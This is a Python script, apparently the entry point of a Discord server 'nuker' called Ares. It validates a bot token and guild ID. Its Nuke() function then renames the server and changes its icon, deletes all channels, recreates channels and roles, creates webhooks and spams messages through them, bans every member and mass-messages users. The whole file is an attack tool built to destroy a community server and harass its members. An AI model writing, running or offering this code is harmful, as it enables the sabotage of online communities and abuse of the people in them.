from AresCore.channels import CreateChannels, DeleteChannels
from AresCore.users import BanAll, SendMessage
from AresCore.roles import CreateRoles
from AresCore.webhooks import CreateWebhooks, GetWebhooks, WebhooksSend
from AresCore.guild import ChangeNameGuild, ChangeIconGuild
from AresCore.requests_maker import StartRequestMaker
from AresCore import CheckToken, IsGuild, GetAllGuilds
from Utils import clear
from rich import print as rprint
import global_vars, os

StartRequestMaker()

config = global_vars.config
token = config['bot']['token']

def bot_check() -> None:
	clear()

	rprint('[purple] > Checking Token Bot [white]')
	rprint('[purple] > Checking ID Guild [white]')
	if CheckToken(token, 'bot'):
		rprint('[chartreuse3] > Token bot is vaild [white]')
	else:
		rprint('[red3] > Token bot is invaild [white]')
		os._exit(0)

	if IsGuild():
		rprint('[chartreuse3] > ID Guild is vaild [white]')
	else:
		rprint('[red3] > ID Guild is invaild [white]')
		GetAllGuilds()
		os._exit(0)


def Nuke() -> None:
	ChangeNameGuild()
	ChangeIconGuild()
	DeleteChannels()
	CreateChannels()
	CreateRoles()
	CreateWebhooks()
	WebhooksSend()
	BanAll()
	SendMessage()

